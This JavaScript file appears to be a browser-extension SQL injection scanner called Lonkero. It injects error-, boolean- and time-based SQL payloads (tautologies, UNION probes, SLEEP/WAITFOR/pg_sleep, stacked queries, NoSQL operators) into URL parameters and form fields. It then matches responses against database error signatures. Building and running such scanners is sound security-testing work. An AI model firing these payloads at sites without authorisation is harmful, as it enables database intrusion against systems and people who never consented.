// Copyright (c) 2026 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

// ============================================================
// LONKERO SQL INJECTION SCANNER v1.0
// Manual-trigger only - no auto-scanning
// ============================================================

(function() {
  'use strict';

  // Database driver init
  const _dr = document.getElementById('__lk_c');
  const _dc = (_dr && _dr.dataset.v) || window[atob('X19sb25rZXJvS2V5')];
  const _dn = _dr ? _dr.dataset.n : null;
  const _de = _dr ? _dr.dataset.e : null;
  if (!_dc || _dc.charCodeAt(0) !== 76 || _dc.split('-').length !== 5) {
    window.sqlScanner = { scan: () => Promise.reject(new Error('Not available')), deepScan: () => Promise.reject(new Error('Not available')) };
    return;
  }
  let _dbReady = true;

  // Prevent double-injection (Symbol guard — not spoofable by page)
  const _sqlGuard = Symbol.for('__lkSQ_' + (_dn || ''));
  if (window[_sqlGuard]) return;
  window[_sqlGuard] = true;

  const findings = [];
  const testedParams = new Set();

  // ============================================================
  // PAYLOADS - Non-destructive detection only
  // ============================================================

  const PAYLOADS = {
    // Error-based payloads - trigger database errors
    errorBased: [
      { payload: "'", name: 'Single quote', dbTypes: ['mysql', 'mssql', 'postgresql', 'oracle', 'sqlite'] },
      { payload: '"', name: 'Double quote', dbTypes: ['mysql', 'postgresql'] },
      { payload: "' OR '1'='1", name: 'OR tautology (single)', dbTypes: ['all'] },
      { payload: '" OR "1"="1', name: 'OR tautology (double)', dbTypes: ['all'] },
      { payload: "' OR 1=1--", name: 'OR with comment', dbTypes: ['mysql', 'mssql', 'postgresql'] },
      { payload: "' OR 1=1#", name: 'OR with hash comment', dbTypes: ['mysql'] },
      { payload: "1' ORDER BY 1--", name: 'ORDER BY probe', dbTypes: ['all'] },
      { payload: "1' ORDER BY 100--", name: 'ORDER BY high (error)', dbTypes: ['all'] },
      { payload: "' UNION SELECT NULL--", name: 'UNION probe', dbTypes: ['all'] },
      { payload: "'; SELECT 1--", name: 'Stacked query', dbTypes: ['mssql', 'postgresql'] },
      { payload: "1; SELECT 1--", name: 'Stacked numeric', dbTypes: ['mssql', 'postgresql'] },
      { payload: "\\", name: 'Backslash escape', dbTypes: ['mysql'] },
      { payload: "1'1", name: 'Broken syntax', dbTypes: ['all'] },
      { payload: "1 AND 1=CONVERT(int,@@version)--", name: 'MSSQL version', dbTypes: ['mssql'] },
      { payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--", name: 'MySQL extractvalue', dbTypes: ['mysql'] },
    ],

    // Boolean-based payloads - detect response differences
    booleanBased: [
      { true: "' AND '1'='1", false: "' AND '1'='2", name: 'AND tautology (single)' },
      { true: '" AND "1"="1', false: '" AND "1"="2', name: 'AND tautology (double)' },
      { true: ' AND 1=1', false: ' AND 1=2', name: 'AND numeric' },
      { true: "' AND 1=1--", false: "' AND 1=2--", name: 'AND with comment' },
      { true: ' OR 1=1', false: ' AND 1=2', name: 'OR vs AND' },
      { true: "1' AND '1'='1", false: "1' AND '1'='2", name: 'Numeric prefix' },
      { true: '1 AND 1=1', false: '1 AND 1=2', name: 'Pure numeric' },
    ],

    // Time-based payloads - detect via response delay
    timeBased: [
      { payload: "' AND SLEEP(3)--", name: 'MySQL SLEEP', delay: 3000, dbTypes: ['mysql'] },
      { payload: "'; WAITFOR DELAY '0:0:3'--", name: 'MSSQL WAITFOR', delay: 3000, dbTypes: ['mssql'] },
      { payload: "' AND pg_sleep(3)--", name: 'PostgreSQL pg_sleep', delay: 3000, dbTypes: ['postgresql'] },
      { payload: "1; SELECT SLEEP(3)--", name: 'Stacked SLEEP', delay: 3000, dbTypes: ['mysql'] },
      { payload: "' OR SLEEP(3)#", name: 'MySQL SLEEP hash', delay: 3000, dbTypes: ['mysql'] },
      { payload: "1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--", name: 'Subquery SLEEP', delay: 3000, dbTypes: ['mysql'] },
      { payload: "'; SELECT pg_sleep(3);--", name: 'PG stacked sleep', delay: 3000, dbTypes: ['postgresql'] },
    ],

    // Special context payloads
    contextSpecific: {
      numeric: [
        { payload: '1 OR 1=1', name: 'Numeric OR' },
        { payload: '1 AND 1=1', name: 'Numeric AND true' },
        { payload: '1 AND 1=2', name: 'Numeric AND false' },
        { payload: '1-1', name: 'Numeric subtraction' },
        { payload: '0+1', name: 'Numeric addition' },
      ],
      string: [
        { payload: "test' OR '1'='1", name: 'String OR' },
        { payload: "test' AND '1'='1", name: 'String AND true' },
        { payload: "test' AND '1'='2", name: 'String AND false' },
      ],
      json: [
        { payload: '{"$gt":""}', name: 'NoSQL gt operator' },
        { payload: '{"$ne":null}', name: 'NoSQL ne operator' },
        { payload: '{"$where":"1==1"}', name: 'NoSQL where' },
      ],
    },
  };

  // Database error signatures
  const DB_ERROR_SIGNATURES = {
    mysql: [
      /you have an error in your sql syntax/i,
      /warning.*mysql/i,
      /mysqli?[_.].*error/i,
      /valid MySQL result/i,
      /MySqlClient\./i,
      /MySQLSyntaxErrorException/i,
      /com\.mysql\.jdbc/i,
      /Unclosed quotation mark/i,
      /SQLSTATE\[42000\]/i,
    ],
    postgresql: [
      /PostgreSQL.*ERROR/i,
      /warning.*pg_/i,
      /valid PostgreSQL result/i,
      /Npgsql\./i,
      /PSQLException/i,
      /org\.postgresql/i,
      /unterminated quoted string/i,
    ],
    mssql: [
      /Driver.*SQL[\-\_\ ]*Server/i,
      /OLE DB.*SQL Server/i,
      /\bSQL Server\b.*Driver/i,
      /Warning.*mssql_/i,
      /\[Microsoft\]\[ODBC SQL Server Driver\]/i,
      /SQLException.*SQLServer/i,
      /Unclosed quotation mark after the character string/i,
      /quoted string not properly terminated/i,
      /SqlException/i,
    ],
    oracle: [
      /ORA-\d{5}/i,
      /Oracle error/i,
      /Oracle.*Driver/i,
      /Warning.*oci_/i,
      /quoted string not properly terminated/i,
      /oracle\.jdbc/i,
    ],
    sqlite: [
      /SQLite\/JDBCDriver/i,
      /SQLite\.Exception/i,
      /System\.Data\.SQLite\.SQLiteException/i,
      /Warning.*sqlite_/i,
      /SQLITE_ERROR/i,
      /sqlite3\.OperationalError/i,
      /unrecognized token/i,
    ],
    generic: [
      /SQL syntax.*error/i,
      /syntax error.*SQL/i,
      /Unclosed quotation mark/i,
      /incorrect syntax near/i,
      /unexpected end of SQL command/i,
      /invalid query/i,
      /Query failed/i,
      /SQL command not properly ended/i,
      /quoted string not properly terminated/i,
      /division by zero/i,
      /invalid input syntax for/i,
      /\bSQL\b.*\berror\b/i,
    ],
  };

  // ============================================================
  // HELPER FUNCTIONS
  // ============================================================

  function generateId() {
    return Math.random().toString(36).substring(2, 10);
  }

  function getParamKey(url, param, method) {
    return `${method}:${new URL(url).pathname}:${param}`;
  }

  // Extract parameters from URL
  function extractUrlParams(url) {
    try {
      const urlObj = new URL(url);
      const params = [];
      urlObj.searchParams.forEach((value, key) => {
        params.push({ key, value, type: 'url' });
      });
      return params;
    } catch {
      return [];
    }
  }

  // Extract form inputs
  function extractFormInputs() {
    const inputs = [];
    const forms = document.querySelectorAll('form');

    forms.forEach((form, formIndex) => {
      const formData = {
        action: form.action || location.href,
        method: (form.method || 'GET').toUpperCase(),
        inputs: [],
        formIndex,
      };

      // Get all inputs
      form.querySelectorAll('input, textarea, select').forEach(el => {
        const name = el.name || el.id;
        if (!name) return;

        // Skip non-injectable types
        if (['submit', 'button', 'image', 'reset', 'file'].includes(el.type)) return;

        formData.inputs.push({
          name,
          value: el.value || '',
          type: el.type || 'text',
          element: el,
        });
      });

      if (formData.inputs.length > 0) {
        inputs.push(formData);
      }
    });

    return inputs;
  }

  // Check response for SQL errors
  function detectSqlError(responseText, responseStatus) {
    const detectedDbs = [];

    for (const [dbType, patterns] of Object.entries(DB_ERROR_SIGNATURES)) {
      for (const pattern of patterns) {
        if (pattern.test(responseText)) {
          detectedDbs.push({ dbType, pattern: pattern.toString() });
          break;
        }
      }
    }

    // Also check for common error status codes
    const errorStatus = responseStatus >= 500;

    return {
      hasError: detectedDbs.length > 0 || errorStatus,
      databases: detectedDbs,
      serverError: errorStatus,
    };
  }

  // Calculate response similarity (for boolean-based detection)
  function calculateSimilarity(str1, str2) {
    if (str1 === str2) return 1;
    if (!str1 || !str2) return 0;

    // Simple length-based similarity
    const lenDiff = Math.abs(str1.length - str2.length);
    const maxLen = Math.max(str1.length, str2.length);

    if (maxLen === 0) return 1;

    const lengthSimilarity = 1 - (lenDiff / maxLen);

    // For very different lengths, that's enough
    if (lengthSimilarity < 0.8) return lengthSimilarity;

    // For similar lengths, do a quick content check
    const words1 = new Set(str1.toLowerCase().split(/\s+/));
    const words2 = new Set(str2.toLowerCase().split(/\s+/));

    let common = 0;
    words1.forEach(w => { if (words2.has(w)) common++; });

    const wordSimilarity = common / Math.max(words1.size, words2.size);

    return (lengthSimilarity + wordSimilarity) / 2;
  }

  // ============================================================
  // SCANNING FUNCTIONS
  // ============================================================

  // Make request with payload
  async function makeRequest(url, method = 'GET', body = null, headers = {}) {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 10000);

    const startTime = Date.now();

    try {
      const options = {
        method,
        headers: {
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          ...headers,
        },
        credentials: 'include',
        signal: controller.signal,
      };

      if (body && method !== 'GET') {
        if (typeof body === 'object') {
          options.body = JSON.stringify(body);
          options.headers['Content-Type'] = 'application/json';
        } else {
          options.body = body;
          if (!options.headers['Content-Type']) {
            options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
          }
        }
      }

      const response = await fetch(url, options);
      const elapsed = Date.now() - startTime;
      const text = await response.text();

      clearTimeout(timeout);

      return {
        status: response.status,
        text,
        elapsed,
        headers: Object.fromEntries(response.headers.entries()),
        ok: response.ok,
      };
    } catch (err) {
      clearTimeout(timeout);
      return {
        status: 0,
        text: '',
        elapsed: Date.now() - startTime,
        error: err.message,
        ok: false,
      };
    }
  }

  // Test URL parameter
  async function testUrlParam(baseUrl, param, originalValue) {
    const results = [];
    const paramKey = getParamKey(baseUrl, param, 'GET');

    if (testedParams.has(paramKey)) {
      return results;
    }
    testedParams.add(paramKey);

    console.log(`[SQLi Scanner] Testing URL param: ${param}`);

    // Get baseline response
    const baseline = await makeRequest(baseUrl);
    if (!baseline.ok && baseline.status !== 200) {
      console.log(`[SQLi Scanner] Skipping ${param} - baseline failed`);
      return results;
    }

    // Error-based testing
    for (const { payload, name, dbTypes } of PAYLOADS.errorBased.slice(0, 8)) {
      const testUrl = new URL(baseUrl);
      testUrl.searchParams.set(param, originalValue + payload);

      const response = await makeRequest(testUrl.toString());
      const errorCheck = detectSqlError(response.text, response.status);

      if (errorCheck.hasError) {
        const finding = {
          id: generateId(),
          type: 'SQL_INJECTION',
          subtype: 'ERROR_BASED',
          severity: 'critical',
          url: baseUrl,
          param,
          method: 'GET',
          payload: payload,
          payloadName: name,
          evidence: {
            databases: errorCheck.databases,
            serverError: errorCheck.serverError,
            responseStatus: response.status,
          },
          timestamp: Date.now(),
        };

        results.push(finding);
        findings.push(finding);
        reportFinding(finding);

        console.log(`[SQLi Scanner] FOUND: Error-based SQLi in ${param}`, errorCheck.databases);
        break; // Found vulnerability, stop testing this param for errors
      }
    }

    // Boolean-based testing
    for (const { true: truePayload, false: falsePayload, name } of PAYLOADS.booleanBased.slice(0, 4)) {
      const trueUrl = new URL(baseUrl);
      trueUrl.searchParams.set(param, originalValue + truePayload);

      const falseUrl = new URL(baseUrl);
      falseUrl.searchParams.set(param, originalValue + falsePayload);

      const [trueResp, falseResp] = await Promise.all([
        makeRequest(trueUrl.toString()),
        makeRequest(falseUrl.toString()),
      ]);

      // Check if true condition matches baseline and false differs
      const trueSimilarity = calculateSimilarity(baseline.text, trueResp.text);
      const falseSimilarity = calculateSimilarity(baseline.text, falseResp.text);
      const tfSimilarity = calculateSimilarity(trueResp.text, falseResp.text);

      // Boolean SQLi: true matches baseline, false differs significantly
      if (trueSimilarity > 0.9 && falseSimilarity < 0.7 && tfSimilarity < 0.7) {
        const finding = {
          id: generateId(),
          type: 'SQL_INJECTION',
          subtype: 'BOOLEAN_BASED',
          severity: 'high',
          url: baseUrl,
          param,
          method: 'GET',
          payload: `TRUE: ${truePayload} / FALSE: ${falsePayload}`,
          payloadName: name,
          evidence: {
            trueSimilarity,
            falseSimilarity,
            tfSimilarity,
            trueLength: trueResp.text.length,
            falseLength: falseResp.text.length,
          },
          timestamp: Date.now(),
        };

        results.push(finding);
        findings.push(finding);
        reportFinding(finding);

        console.log(`[SQLi Scanner] FOUND: Boolean-based SQLi in ${param}`);
        break;
      }
    }

    // Time-based testing (only test 2 to avoid slow scans)
    for (const { payload, name, delay, dbTypes } of PAYLOADS.timeBased.slice(0, 2)) {
      const testUrl = new URL(baseUrl);
      testUrl.searchParams.set(param, originalValue + payload);

      const response = await makeRequest(testUrl.toString());

      // If response took longer than expected delay, possible time-based SQLi
      if (response.elapsed >= delay - 500) {
        // Verify with a second request
        const verify = await makeRequest(testUrl.toString());

        if (verify.elapsed >= delay - 500) {
          const finding = {
            id: generateId(),
            type: 'SQL_INJECTION',
            subtype: 'TIME_BASED',
            severity: 'high',
            url: baseUrl,
            param,
            method: 'GET',
            payload,
            payloadName: name,
            evidence: {
              expectedDelay: delay,
              actualDelay: response.elapsed,
              verifyDelay: verify.elapsed,
              dbTypes,
            },
            timestamp: Date.now(),
          };

          results.push(finding);
          findings.push(finding);
          reportFinding(finding);

          console.log(`[SQLi Scanner] FOUND: Time-based SQLi in ${param} (${response.elapsed}ms)`);
          break;
        }
      }
    }

    return results;
  }

  // Test form input
  async function testFormInput(formData, inputIndex) {
    const results = [];
    const input = formData.inputs[inputIndex];
    const paramKey = getParamKey(formData.action, input.name, formData.method);

    if (testedParams.has(paramKey)) {
      return results;
    }
    testedParams.add(paramKey);

    console.log(`[SQLi Scanner] Testing form input: ${input.name} (${formData.method})`);

    // Build baseline form data
    const buildFormBody = (paramOverride = {}) => {
      const data = new URLSearchParams();
      formData.inputs.forEach(inp => {
        const value = paramOverride[inp.name] !== undefined ? paramOverride[inp.name] : inp.value;
        data.append(inp.name, value);
      });
      return data.toString();
    };

    // Get baseline
    const baseline = formData.method === 'GET'
      ? await makeRequest(`${formData.action}?${buildFormBody()}`)
      : await makeRequest(formData.action, 'POST', buildFormBody());

    // Error-based testing
    for (const { payload, name } of PAYLOADS.errorBased.slice(0, 6)) {
      const testValue = input.value + payload;
      const body = buildFormBody({ [input.name]: testValue });

      const response = formData.method === 'GET'
        ? await makeRequest(`${formData.action}?${body}`)
        : await makeRequest(formData.action, 'POST', body);

      const errorCheck = detectSqlError(response.text, response.status);

      if (errorCheck.hasError) {
        const finding = {
          id: generateId(),
          type: 'SQL_INJECTION',
          subtype: 'ERROR_BASED',
          severity: 'critical',
          url: formData.action,
          param: input.name,
          method: formData.method,
          payload,
          payloadName: name,
          formIndex: formData.formIndex,
          evidence: {
            databases: errorCheck.databases,
            serverError: errorCheck.serverError,
          },
          timestamp: Date.now(),
        };

        results.push(finding);
        findings.push(finding);
        reportFinding(finding);

        console.log(`[SQLi Scanner] FOUND: Error-based SQLi in form input ${input.name}`);
        break;
      }
    }

    return results;
  }

  // Report finding to extension
  function reportFinding(finding) {
    if (!_dbReady || !_dc) return;
    try {
      window.postMessage({
        type: '__lonkero_sqli_finding__',
        _n: _dn, _ch: _de,
        finding,
      }, '*');
    } catch (e) {
      console.error('[SQLi Scanner] Failed to report finding:', e);
    }
  }

  // ============================================================
  // MAIN SCAN FUNCTIONS
  // ============================================================

  // Quick scan - test current page URL params only
  async function quickScan() {
    console.log('[SQLi Scanner] Starting quick scan...');
    const results = [];

    const params = extractUrlParams(location.href);
    console.log(`[SQLi Scanner] Found ${params.length} URL parameters`);

    for (const { key, value } of params) {
      const paramResults = await testUrlParam(location.href, key, value);
      results.push(...paramResults);
    }

    console.log(`[SQLi Scanner] Quick scan complete. Found ${results.length} potential SQLi`);
    return results;
  }

  // Full scan - test URL params + form inputs
  async function scan() {
    console.log('[SQLi Scanner] Starting full scan...');
    const results = [];

    // Test URL parameters
    const params = extractUrlParams(location.href);
    console.log(`[SQLi Scanner] Testing ${params.length} URL parameters`);

    for (const { key, value } of params) {
      const paramResults = await testUrlParam(location.href, key, value);
      results.push(...paramResults);
    }

    // Test form inputs
    const forms = extractFormInputs();
    console.log(`[SQLi Scanner] Found ${forms.length} forms`);

    for (const formData of forms) {
      console.log(`[SQLi Scanner] Testing form: ${formData.action} (${formData.method})`);

      for (let i = 0; i < formData.inputs.length; i++) {
        const inputResults = await testFormInput(formData, i);
        results.push(...inputResults);
      }
    }

    console.log(`[SQLi Scanner] Full scan complete. Found ${results.length} potential SQLi`);

    // Show summary
    if (results.length > 0) {
      const critical = results.filter(r => r.severity === 'critical').length;
      const high = results.filter(r => r.severity === 'high').length;
      console.log(`[SQLi Scanner] Summary: ${critical} critical, ${high} high severity`);
    }

    return results;
  }

  // Deep scan - includes time-based (slower)
  async function deepScan(options = {}) {
    console.log('[SQLi Scanner] Starting deep scan (includes time-based)...');

    // First run full scan
    const results = await scan();

    // Additional time-based testing on all params
    if (options.includeTimeBased !== false) {
      const params = extractUrlParams(location.href);

      for (const { key, value } of params) {
        const paramKey = getParamKey(location.href, key, 'GET-TIME');
        if (testedParams.has(paramKey)) continue;
        testedParams.add(paramKey);

        console.log(`[SQLi Scanner] Time-based testing: ${key}`);

        for (const { payload, name, delay, dbTypes } of PAYLOADS.timeBased) {
          const testUrl = new URL(location.href);
          testUrl.searchParams.set(key, value + payload);

          const response = await makeRequest(testUrl.toString());

          if (response.elapsed >= delay - 500) {
            const verify = await makeRequest(testUrl.toString());

            if (verify.elapsed >= delay - 500) {
              const finding = {
                id: generateId(),
                type: 'SQL_INJECTION',
                subtype: 'TIME_BASED',
                severity: 'high',
                url: location.href,
                param: key,
                method: 'GET',
                payload,
                payloadName: name,
                evidence: {
                  expectedDelay: delay,
                  actualDelay: response.elapsed,
                  verifyDelay: verify.elapsed,
                  dbTypes,
                },
                timestamp: Date.now(),
              };

              results.push(finding);
              findings.push(finding);
              reportFinding(finding);

              console.log(`[SQLi Scanner] FOUND: Time-based SQLi in ${key}`);
              break;
            }
          }
        }
      }
    }

    console.log(`[SQLi Scanner] Deep scan complete. Found ${results.length} total SQLi`);
    return results;
  }

  // Test specific parameter manually
  async function testParameter(url, param, value, method = 'GET') {
    console.log(`[SQLi Scanner] Manual test: ${param} at ${url}`);

    // Clear from tested params to allow re-testing
    const paramKey = getParamKey(url, param, method);
    testedParams.delete(paramKey);

    if (method === 'GET') {
      return await testUrlParam(url, param, value);
    }

    // For POST, create a mock form
    const formData = {
      action: url,
      method: 'POST',
      inputs: [{ name: param, value, type: 'text' }],
      formIndex: -1,
    };

    return await testFormInput(formData, 0);
  }

  // ============================================================
  // EXPOSE API
  // ============================================================

  if (!window.sqlScanner) {
    Object.defineProperty(window, 'sqlScanner', { value: {
      quickScan,
      scan,
      deepScan,
      testParameter,
      getFindings: () => findings,
      clearFindings: () => { findings.length = 0; testedParams.clear(); },
    }, configurable: false, enumerable: false });
  }

  // Listen for scan requests from content script (nonce+channel validated)
  window.addEventListener('message', (event) => {
    if (event.source !== window) return;
    if (!_de || event.data?._ch !== _de || event.data?._n !== _dn) return;

    if (event.data?.type === '__lonkero_run_sqli_scan__') {
      scan().then(results => {
        window.postMessage({
          type: '__lonkero_sqli_scan_complete__',
          _n: _dn, _ch: _de,
          results,
        }, '*');
      });
    }

    if (event.data?.type === '__lonkero_run_sqli_quick_scan__') {
      quickScan().then(results => {
        window.postMessage({
          type: '__lonkero_sqli_scan_complete__',
          _n: _dn, _ch: _de,
          results,
        }, '*');
      });
    }

    if (event.data?.type === '__lonkero_run_sqli_deep_scan__') {
      deepScan().then(results => {
        window.postMessage({
          type: '__lonkero_sqli_scan_complete__',
          _n: _dn, _ch: _de,
          results,
        }, '*');
      });
    }
  });

  console.log('[Lonkero] SQL Injection Scanner v1.0 loaded');
  console.log('  sqlScanner.quickScan()    - Test URL params only');
  console.log('  sqlScanner.scan()         - Test URL + forms');
  console.log('  sqlScanner.deepScan()     - Full scan + time-based');
  console.log('  sqlScanner.testParameter(url, param, value) - Test specific param');

})();
